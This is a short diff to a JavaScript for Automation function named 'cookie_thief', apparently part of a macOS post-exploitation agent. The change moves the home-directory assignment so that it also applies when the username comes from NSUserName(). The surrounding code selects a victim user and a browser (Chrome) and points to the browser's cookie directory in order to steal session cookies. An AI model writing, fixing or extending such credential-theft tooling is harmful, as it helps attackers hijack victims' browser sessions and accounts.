@@ -15,12 +15,13 @@ exports.cookie_thief = function(task, command, params){
     }
 
     if(config.hasOwnProperty("username") && typeof config['username'] == 'string') {
-        username = config['username'];
-        homedir = homedir += username + "/";
+        username = config['username'];  
     }
     else {
         username = $.NSUserName();
     }
+    homedir = homedir += username + "/";
+
     if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){ browser = config['browser']; }
     if(browser == "chrome") {
         cookiedir = chromeCookieDir;
